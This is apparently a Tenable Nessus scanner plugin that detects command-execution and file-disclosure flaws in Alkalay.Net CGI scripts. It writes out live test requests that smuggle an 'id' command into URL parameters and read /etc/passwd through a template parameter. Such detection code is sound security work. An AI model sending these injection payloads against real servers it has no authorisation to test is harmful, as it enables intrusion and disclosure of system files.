#
# (C) Tenable Network Security
#


  desc["english"] = "
Synopsis :

The remote web server contains a CGI script that allows for arbitrary
command execution and file disclosure. 

Description :

The remote host appears to be running at least one CGI script written
by Avi Alkalay that allows attackers to execute arbitrary commands or
read arbitrary files on the remote host subject to the privileges of
the web server user id. 

See also :

http://www.cirt.net/advisories/alkalay.shtml

Solution : 

Remove the affected scripts.

Risk factor :

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(19780);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2005-3094", "CVE-2005-3095", "CVE-2005-3096", "CVE-2005-3097");
  script_bugtraq_id(14893);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"19519");
    script_xref(name:"OSVDB", value:"19520");
    script_xref(name:"OSVDB", value:"19521");
    script_xref(name:"OSVDB", value:"19522");
  }

  name["english"] = "Alkalay.Net Multiple Scripts Arbitrary Command Execution Vulnerabilities";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for arbitrary command execution vulnerabilities in multiple scripts from Alkalay.Net";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);


# Try to exploit the various flaws.
#
# nb: these scripts use CGI.pm to parse parameters and that wants
#     to parse on ';' as well as '&'; we can get around this by
#     url encoding semicolons in the exploits that use them.

http_check_remote_code(
  extra_dirs:"",
  check_request:"/man-cgi?section=0&topic=ls%3bid",
  check_result:"uid=[0-9]+.*gid=[0-9]+.*",
  command:"id",
  description:desc["english"],
  port:port
);

http_check_remote_code(
  extra_dirs:"",
  check_request:"/nslookup.cgi?query=localhost%3bid&type=ANY&ns=",
  check_result:"uid=[0-9]+.*gid=[0-9]+.*",
  command:"id",
  description:desc["english"],
  port:port
);

http_check_remote_code(
  extra_dirs:"",
  check_request:'/notify?from=nessus"|id"',
  check_result:"uid=[0-9]+.*gid=[0-9]+.*",
  command:"id",
  description:desc["english"],
  port:port
);

foreach script (make_list("contribute.cgi", "contribute.pl")) {
  req = http_get(
    item:string(
      "/", script, "?", 
      "template=/etc/passwd&",
      "contribdir=.&",
      "plugin=", SCRIPT_NAME
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if there's an entry for root.
  if (egrep(string:res, pattern:"root:.+:0:")) {
    security_hole(port);
    exit(0);
  }
}
